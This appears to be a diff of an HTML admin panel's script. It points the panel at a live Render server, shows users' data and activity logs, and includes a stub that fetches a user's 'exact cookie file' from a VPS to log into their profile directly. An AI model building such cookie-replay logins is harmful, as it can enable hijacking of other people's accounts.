@@ -255,8 +255,7 @@
     </div>
 
     <script>
-        // Yahan apna Render server ka live URL daal dein (jo abhi aapko mila hai)
-        const SERVER_URL = "https://admin-panel-xxxx.onrender.com"; 
+        const SERVER_URL = "https://admin-panel-xnks.onrender.com"; 
         let globalUsersData = [];
 
         async function fetchCloudData() {
@@ -275,7 +274,6 @@
 
                 renderTable(globalUsersData);
 
-                // Latest activity log show karein
                 let latestLog = globalUsersData.length > 0 ? globalUsersData[globalUsersData.length - 1].live_logs : "No activity yet";
                 document.getElementById("liveLogsView").innerText = latestLog;
                 document.getElementById("rawJsonView").innerText = JSON.stringify(globalUsersData, null, 4);
@@ -367,7 +365,6 @@
 
         function loginOnProfile(email, profileId, platform) {
             alert(`Fetching exact cookie file from VPS for ${email} (Profile #${profileId}) and logging in directly!`);
-            // App ya browser extension yahan se VPS par GET request karke exact cookie load karke login karega
         }
 
         async function deleteUserSession(email) {
